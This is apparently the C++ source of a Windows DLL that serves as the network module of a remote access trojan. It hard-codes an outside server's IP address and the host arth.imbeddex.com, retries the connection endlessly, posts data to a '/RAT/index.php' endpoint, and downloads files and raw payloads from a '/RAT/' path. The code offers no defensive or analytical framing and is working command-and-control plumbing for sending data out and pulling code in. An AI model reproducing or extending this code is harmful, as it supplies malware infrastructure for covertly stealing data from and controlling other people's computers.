//cl /EHsc /LD .\network_lib.cpp /link User32.lib
#include <iostream>
#include <ws2tcpip.h>
#include <Windows.h>
#include <string>
#include <sstream>
#include <mutex>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

SOCKET clientSocket;
std::mutex socketMutex; 

int safe_closesocket(SOCKET &clientSocket)
{
    if (clientSocket != INVALID_SOCKET)
    {
        shutdown(clientSocket, SD_BOTH);
        closesocket(clientSocket);

        clientSocket = INVALID_SOCKET;
        return 0;
    }
    else return 1;
}

int socket_setup(SOCKET &clientSocket)
{
    bool connected = false;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed.\n";
        return 0;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET)
    {
        std::cerr << "socket failed.\n";
        WSACleanup();
        return 0;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(80);
    serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");

    while (!connected)
    {
        if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            if (error != WSAECONNREFUSED)
            {
                std::stringstream ss;
                ss << "Connection failed with error: " << error << " (" << gai_strerror(error) << "). Retrying in 2 seconds...\n";
                std::cerr << ss.str();
            }   
            else std::cerr << "Connection refused. Retrying in 2 seconds...\n";
            Sleep(2000);
        }
        else connected = true;

    }
    return 1;
}

__declspec(dllexport) int send_data(const std::string& filename , const std::string& data)
{
    {
        std::lock_guard<std::mutex> lock1(socketMutex); 
        
        if(!socket_setup(clientSocket)) return 1;


        std::stringstream httpRequest;
        httpRequest << "POST /RAT/index.php HTTP/1.1\r\n"
                    << "Host: arth.imbeddex.com\r\n"
                    << "Content-Length: " << (filename.length() + data.length()) << "\r\n"
                    << "Content-Type: application/octet-stream\r\n"
                    << "Connection: close\r\n\r\n"
                    << filename << data;

        std::string requestString = httpRequest.str();
        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);        
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            std::cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
            return 1;
        }

        if(!safe_closesocket(clientSocket)) return 1;
        return 0;
    }
}

__declspec(dllexport) std::string receive_data(const std::string &filename)
{
    {
        std::lock_guard<std::mutex> lock1(socketMutex);

        socket_setup(clientSocket);

        std::string f_name = filename;
        std::stringstream httpRequest;
        httpRequest << "GET /RAT/" << f_name << " HTTP/1.1\r\n"
                    << "Host: arth.imbeddex.com\r\n"
                    << "Connection: close\r\n\r\n";

        std::string requestString = httpRequest.str();
        int bytesSent = send(clientSocket, requestString.c_str(), requestString.length(), 0);
        if (bytesSent == SOCKET_ERROR)
        {
            int error = WSAGetLastError();
            //cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
        }

        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        char buffer[4096]; // Increased buffer size
        std::string receivedData;
        int bytesReceived;

        do {
            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
            if (bytesReceived > 0)
            {
                buffer[bytesReceived] = '\0';
                receivedData += buffer;
            } 
            else if (bytesReceived == 0)
            {
                std::cerr << "Connection closed by server." << std::endl;
                break;
            } else
            {
                int error = WSAGetLastError();
                if (error != WSAECONNRESET) std::cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
                break; // Exit loop on error
            }
        } while (bytesReceived == sizeof(buffer) - 1);

        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        // Robust HTTP response parsing
        size_t headerEnd = receivedData.find("\r\n\r\n");
        if (headerEnd == std::string::npos)
        {
            std::cerr << "Invalid HTTP receivedData: No header/body separator found." << std::endl;
            return "";
        }

        std::string body = receivedData.substr(headerEnd + 4);

        //Handle chunked transfer encoding (if present)
        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
        if (transferEncodingPos != std::string::npos)
        {
            std::string unchunkedBody;
            std::istringstream bodyStream(body);
            std::string chunkLengthStr;

            while (getline(bodyStream, chunkLengthStr))
            {
                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;

                size_t chunkSize;
                std::stringstream ss;
                ss << std::hex << chunkLengthStr;
                ss >> chunkSize;

                if (chunkSize == 0) break; // End of chunked data

                std::string chunkData(chunkSize, '\0');
                bodyStream.read(&chunkData[0], chunkSize);

                unchunkedBody += chunkData;
                bodyStream.ignore(2); // Consume CRLF after chunk
            }
            body = unchunkedBody;
        }

        safe_closesocket(clientSocket);
        return body;
    }
}

__declspec(dllexport) std::vector<unsigned char> receive_data_raw(const std::string &filename)
{
    std::lock_guard<std::mutex> lock1(socketMutex);

    socket_setup(clientSocket);

    // Send HTTP GET request
    std::string httpRequest = "GET /RAT/" + filename + " HTTP/1.1\r\n";
    httpRequest += "Host: arth.imbeddex.com\r\n";
    httpRequest += "Connection: close\r\n\r\n";

    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
    if (bytesSent == SOCKET_ERROR)
    {
        int error = WSAGetLastError();
        std::cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << std::endl;
        throw std::runtime_error("Send failed");
    }

    // Receive data in chunks
    char buffer[8192]; // Increased buffer size
    std::vector<unsigned char> receivedData;
    int bytesReceived;

    do {
        bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived > 0) {
            receivedData.insert(receivedData.end(), buffer, buffer + bytesReceived);
        } else if (bytesReceived == 0) {
            //std::cerr << "Connection closed by server." << std::endl;
            break;
        } else {
            int error = WSAGetLastError();
            std::cerr << "Receive failed with error: " << error << std::endl;
            break;
        }
    } while (bytesReceived > 0);

    // Ensure header separator is found
    size_t headerEnd = 0;
    const unsigned char CRLF[] = {0x0D, 0x0A, 0x0D, 0x0A};

    // Search for header separator (CRLF + CRLF)
    for (size_t i = 0; i < receivedData.size() - 3; ++i)
    {
        if (receivedData[i] == CRLF[0] &&
            receivedData[i + 1] == CRLF[1] &&
            receivedData[i + 2] == CRLF[2] &&
            receivedData[i + 3] == CRLF[3])
        {
            headerEnd = i + 4; // Found header, skip the separator
            break;
        }
    }

    if (headerEnd != 0)
    {
        //cout << "Header found at position: " << headerEnd << std::endl;
    }
    else
    {
        std::cerr << "Header separator not found." << std::endl;
        throw std::runtime_error("Header separator not found");
    }

    // Make sure headerEnd + 4 is within the bounds of the receivedData
    if (headerEnd < receivedData.size())
    {
        // Extract body after header (start from headerEnd)
        std::vector<unsigned char> body(receivedData.begin() + headerEnd, receivedData.end());
        safe_closesocket(clientSocket); // Close the socket safely

        return body; // Return the extracted body
    }
    else
    {
        std::cerr << "Body extraction failed: headerEnd exceeds receivedData size." << std::endl;
        safe_closesocket(clientSocket); // Close the socket safely
        throw std::runtime_error("Body extraction failed");
    }
}

BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
        case DLL_PROCESS_ATTACH:
        {
            //MessageBoxA(NULL, "DLL_PROCESS_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION); 
            break;
        }
        case DLL_PROCESS_DETACH:
        {
            //MessageBoxA(NULL, "DLL_PROCESS_DETACH" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            WSACleanup();
            break;
        }
        case DLL_THREAD_ATTACH:
        {
            //MessageBoxA(NULL, "DLL_THREAD_ATTACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            break;
        }
        case DLL_THREAD_DETACH:
        {
            //MessageBoxA(NULL, "DLL_THREAD_DETACH", "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
            break;
        }
    }    
    return TRUE;
}